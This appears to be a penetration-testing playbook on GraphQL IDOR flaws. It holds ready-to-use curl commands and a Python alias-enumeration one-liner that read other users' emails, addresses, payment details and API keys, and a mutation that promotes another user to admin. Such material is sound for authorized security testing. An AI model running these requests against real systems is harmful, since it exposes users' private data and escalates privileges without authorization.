# IDOR via Aliasing — Cross-Account Access

GraphQL queries often accept IDs directly. Test whether the server enforces
ownership. Run `scripts/gql_idor_aliasing.py --field user` with session A, then
compare against the same run with session B.

## Basic IDOR probe

```bash
# Logged in as user A (id=1) — query user B's data
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ user(id: 2) { email phone address paymentMethods { last4 } } }"}'

# Try orders, messages, invoices, appointments
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ order(id: 999) { total items { name } user { email } } }"}'
```

## Field-level IDOR

```bash
# Object is yours — but are ALL fields yours to read?
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ me { id email role isAdmin internalNote rawApiKey } }"}'

# Test privileged mutations on other users
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateUser(id: 2, role: \"admin\") { success } }"}'
```

## Enumeration via aliases

```bash
python3 -c "
import json
aliases = [f'u{i}: user(id: {i}) {{ id email role }}' for i in range(1, 51)]
print(json.dumps({'query': '{ ' + ' '.join(aliases) + ' }'}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' -d @-
```

## Confirmation discipline

- IDOR requires two sessions: session A reading session B's data
- If only your own IDs return data, it's not IDOR — move on
- Check both directions: privileged fields on your own object are also a bug
